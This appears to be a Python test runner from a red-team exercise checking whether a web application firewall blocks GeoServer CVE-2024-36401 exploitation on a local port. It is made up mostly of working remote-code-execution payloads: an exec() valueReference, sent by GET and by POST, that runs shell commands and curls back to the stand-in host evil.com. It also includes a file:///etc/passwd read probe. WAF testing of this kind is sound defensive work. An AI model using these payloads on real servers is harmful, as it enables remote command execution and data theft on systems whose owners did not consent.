# -*- coding: utf-8 -*-
"""Joint-round runner: GeoServer CVE-2024-36401 exec-style probes through the WAF entry (18382).

Replays the rt4_geo.py GS-1/GS-2 shapes against the JOINT stack entry port (rt4_geo.py
is frozen on 18082 and must not be edited). Read-only truth checks excluded here; use
evidence.py afterwards. No rule content is touched."""
import sys

import requests  # noqa: E402
import urllib3  # noqa: E402

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18382"

s = requests.Session()
s.trust_env = False
s.verify = False


def show(label, r):
    txt = r.text
    if len(txt) > 400:
        txt = txt[:200] + "...[" + str(len(txt)) + "B]..." + txt[-200:]
    prot = r.headers.get("X-Protected-By", "-")
    print("[*] %-34s HTTP %s | X-Protected-By=%s | %s"
          % (label, r.status_code, prot, txt.replace("\n", " ")[:380]))


# negative control: file:// via TestWfsPost (WAF 3002 anchors ARGS:url)
r = s.post(BASE + "/geoserver/TestWfsPost", data={"url": "file:///etc/passwd"},
           headers={"Host": "file://"}, timeout=60)
show("file:// control (TestWfsPost)", r)

# GS-1: 36401 exec-style via GET GetPropertyValue valueReference (URI /geoserver/ows, no 3002 anchor)
xpath = ("exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{'/bin/sh','-c',"
         "'touch /tmp/joint_gs_a1; touch /tmp/joint_gs_a2; curl -m 5 -s http://evil.com:8000/rt/joint_gs_callback'})")
r = s.get(BASE + "/geoserver/ows", params={
    "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
    "typeNames": "sf:archsites", "valueReference": xpath,
}, timeout=90)
show("GS-1 GetPropertyValue exec()", r)

# GS-2: same via POST GetFeature shape
body = (
    '<wfs:GetPropertyValue xmlns:sf="http://cite.opengeospatial.org/gmlsf"'
    ' xmlns:wfs="http://www.opengis.net/wfs/2.0"'
    ' service="WFS" version="2.0.0" valueReference="exec(java.lang.Runtime.getRuntime(),'
    'new java.lang.String[]{\x27/bin/sh\x27,\x27-c\x27,\x27touch /tmp/joint_gs_b1\x27})">'
    '<wfs:Query typeNames="sf:archsites"/></wfs:GetPropertyValue>'
)
r = s.post(BASE + "/geoserver/ows", data=body,
           headers={"Content-Type": "application/xml"}, timeout=90)
show("GS-2 GetPropertyValue POST", r)

# GS-3: pure file-write shape (no exec): property写出 to app tree via valueReference? keep exec only.
print("[*] done.")
